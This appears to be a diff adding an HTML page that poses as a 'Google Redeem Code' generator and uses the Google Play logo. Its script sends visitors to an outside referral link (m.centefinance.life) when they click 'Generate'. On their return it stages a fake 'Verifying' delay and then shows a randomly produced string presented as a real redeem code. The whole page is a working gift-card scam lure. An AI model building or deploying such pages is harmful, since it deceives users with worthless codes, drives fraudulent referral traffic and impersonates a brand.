@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Google Redeem Code</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    html { -webkit-text-size-adjust:100%; }
+    body {
+      height:100vh;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      background: linear-gradient(to right, #9b00d5, #427eff);
+      font-family: Arial, sans-serif;
+    }
+    .container {
+      background:white;
+      padding:30px 20px;
+      border-radius:12px;
+      text-align:center;
+      box-shadow:0 4px 10px rgba(0,0,0,0.2);
+      width:90%;
+      max-width:320px;
+    }
+    h2 {
+      background:#f2f2f2;
+      padding:10px;
+      border-radius:8px;
+      margin-bottom:20px;
+      font-size:18px;
+    }
+    .logo-wrapper img {
+      width:80px;
+      margin-bottom:20px;
+    }
+    button {
+      display:block;
+      width:100%;
+      max-width:200px;
+      margin:15px auto 0;
+      padding:12px 0;
+      font-size:16px;
+      color:white;
+      background:#00d44c;
+      border:none;
+      border-radius:8px;
+      cursor:pointer;
+      transition:background 0.3s;
+    }
+    button:hover:not(:disabled) { background:#00b140; }
+    button:disabled {
+      background:gray;
+      cursor:not-allowed;
+    }
+    #codeContainer {
+      display:none;
+      flex-direction:column;
+      align-items:center;
+      margin-top:20px;
+    }
+    #redeemCode {
+      width:100%;
+      padding:12px;
+      font-size:16px;
+      text-align:center;
+      border:2px solid #ccc;
+      border-radius:6px;
+      margin-bottom:10px;
+    }
+    #copyMessage {
+      margin-top:10px;
+      font-size:14px;
+      color:#28a745;
+      visibility:hidden;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Google Redeem Code</h2>
+    <div class="logo-wrapper">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d0/Google_Play_Arrow_logo.svg/512px-Google_Play_Arrow_logo.svg.png" alt="Google Logo">
+    </div>
+
+    <button id="startButton">Generate</button>
+    <button id="verifyButton" style="display:none;">Verify</button>
+
+    <div id="codeContainer">
+      <p>🎉 Redeem Code Generated</p>
+      <input type="text" id="redeemCode" readonly>
+      <button id="copyBtn">Copy</button>
+      <div id="copyMessage">Copied!</div>
+    </div>
+  </div>
+
+  <script>
+    const GENERATE_URL = 'https://m.centefinance.life/?rel=uodkbnhi';
+    const ONE_DAY_MS = 24 * 60 * 60 * 1000;
+
+    const startButton   = document.getElementById('startButton');
+    const verifyButton  = document.getElementById('verifyButton');
+    const codeContainer = document.getElementById('codeContainer');
+    const redeemCode    = document.getElementById('redeemCode');
+    const copyBtn       = document.getElementById('copyBtn');
+    const copyMessage   = document.getElementById('copyMessage');
+
+    // Decide which button to show
+    window.addEventListener('DOMContentLoaded', () => {
+      const ts = localStorage.getItem('generatedAt');
+      if (ts && (Date.now() - parseInt(ts)) < ONE_DAY_MS) {
+        showVerify();
+      } else {
+        localStorage.removeItem('generatedAt');
+        showGenerate();
+      }
+    });
+
+    function showGenerate() {
+      startButton.style.display = 'block';
+      verifyButton.style.display = 'none';
+      codeContainer.style.display = 'none';
+    }
+
+    function showVerify() {
+      startButton.style.display = 'none';
+      verifyButton.style.display = 'block';
+    }
+
+    // Generate button: loading then redirect
+    startButton.addEventListener('click', () => {
+      startButton.disabled  = true;
+      startButton.innerText = 'Loading...';
+      setTimeout(() => {
+        localStorage.setItem('generatedAt', Date.now().toString());
+        window.location.href = GENERATE_URL;
+      }, 800);
+    });
+
+    // Verify logic
+    let hasVerified = false;
+    verifyButton.addEventListener('click', () => {
+      if (hasVerified) return;
+      hasVerified = true;
+      verifyButton.innerText   = 'Verifying...';
+      verifyButton.disabled    = true;
+
+      setTimeout(() => {
+        verifyButton.innerText            = 'Verified';
+        verifyButton.style.backgroundColor = 'gray';
+        codeContainer.style.display       = 'flex';
+        redeemCode.value                  = generateCode();
+      }, 2000);
+    });
+
+    // Copy logic: inline message
+    copyBtn.addEventListener('click', () => {
+      redeemCode.select();
+      document.execCommand('copy');
+      copyMessage.style.visibility = 'visible';
+      setTimeout(() => {
+        copyMessage.style.visibility = 'hidden';
+      }, 2000);
+    });
+
+    function generateCode() {
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+      let code = '';
+      for (let i = 0; i < 16; i++) {
+        code += chars.charAt(Math.floor(Math.random() * chars.length));
+        if ((i + 1) % 4 === 0 && i !== 15) code += '-';
+      }
+      return code;
+    }
+  </script>
+</body>
+</html>
